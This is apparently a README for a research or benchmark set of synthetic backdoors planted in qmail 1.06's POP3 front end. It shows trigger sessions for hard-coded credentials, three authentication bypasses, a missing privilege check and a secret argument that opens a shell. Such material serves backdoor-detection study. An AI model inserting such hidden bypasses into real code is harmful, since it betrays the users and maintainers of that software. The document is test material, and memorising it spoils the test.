# qmail 1.06 backdoors

* Types :
  * Hard-codded credentials
  * Authentication bypasses ($\times 3$)
  * Forgotten check
  * Hidden feature (Reverse shell)
* Affected versions : None (Synthetic backdoors)

## Hard-codded credentials

### Backdoor

Hard-codded credentials are present in the source code (Username : `homer`, Password : `marge`).

### Triggering the backdoor

```console
$ ./qmail-popup-backdoored-1_hard-codded_credentials.ori localhost ./checkpassword ./qmail-pop3d ./Mailbox/
+OK <80993.1744964566@localhost>
USER homer
+OK 
PASS marge
+OK 
LIST
+OK 
1 586
2 5144
3 574
4 568
5 490
.
```

## Authentication bypass 1

### Backdoor

Following twice the legit command `USER milhouse` (`milhouse` is supposed to be a regular user) let to have access to privileged commands.

### Triggering the backdoor

```console
$ ./qmail-popup-backdoored-2_disabled_authentication_1.ori localhost ./checkpassword ./qmail-pop3d ./Mailbox/
+OK <87127.1744964668@localhost>
USER milhouse
+OK 
USER milhouse 
+OK 
LIST
+OK 
1 586
2 5144
3 574
4 568
5 490
.
```

## Authentication bypass 2

### Backdoor

A secret argument for the command `USER` permits to have access to privileged commands.

### Triggering the backdoor

```console
$ ./qmail-popup-backdoored-2_disabled_authentication_2.ori localhost ./checkpassword ./qmail-pop3d ./Mailbox/
+OK <93635.1744964887@localhost>
USER secret
+OK 
LIST
+OK 
1 586
2 5144
3 574
4 568
5 490
.
```

## Authentication bypass 3

### Backdoor

A secret command (`SECR`) permits to have access to privileged commands.

### Triggering the backdoor

```console
$ ./qmail-popup-backdoored-2_disabled_authentication_3.ori localhost ./checkpassword ./qmail-pop3d ./Mailbox/
+OK <99962.1744965058@localhost>
SECR
+OK 
LIST
+OK 
1 586
2 5144
3 574
4 568
5 490
.
```

## Forgotten check

### Backdoor

The privileged command `LIST` is directly available, and permits to have access to all commands.

### Triggering the backdoor

```console
$ ./qmail-popup-backdoored-3_forgotten_check.ori localhost ./checkpassword ./qmail-pop3d ./Mailbox/
+OK <706824.1745137705@localhost>
LIST
+OK 
LIST
+OK 
1 586
2 5144
3 574
4 568
5 490
.
```

## Hidden feature (Reverse shell)

### Backdoor

The secret argument `secretshell` for the command `USER` opens a reverse shell, permitting to execute arbitrary commands on the underlying system.

### Triggering the backdoor

```console
$ ./qmail-popup-backdoored-4_hidden_feature_shell.ori localhost ./checkpassword ./qmail-pop3d ./Mailbox/
+OK <119908.1744965711@localhost>
USER secretshell
sh-5.2$ echo Coucou
Coucou
```